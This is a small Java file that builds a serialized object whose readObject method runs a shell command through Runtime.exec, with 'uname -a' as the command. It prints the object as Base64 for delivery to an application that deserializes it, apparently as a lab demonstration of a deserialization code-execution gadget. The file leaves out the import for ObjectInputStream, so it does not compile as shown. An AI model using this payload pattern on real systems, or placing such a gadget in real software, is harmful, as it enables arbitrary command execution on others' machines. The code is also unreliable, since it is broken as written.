import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.io.Serializable;

class AnotherClass implements Serializable {

  private String command;
  public AnotherClass(String command) {
    this.command = command;
  }

  private void readObject(ObjectInputStream stream) throws Exception {
    stream.defaultReadObject();
    Runtime.getRuntime().exec(this.command);
  }

}  

public class javaSerial {

	public static void main(String[] args) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
	    ObjectOutputStream os = new ObjectOutputStream(bos);
	    AnotherClass gadget = new AnotherClass("/usr/bin/uname -a");
	   
	    os.writeObject(gadget);
	    String base64 = Base64.getEncoder().encodeToString(bos.toByteArray());
	    System.out.println(base64);
	}

}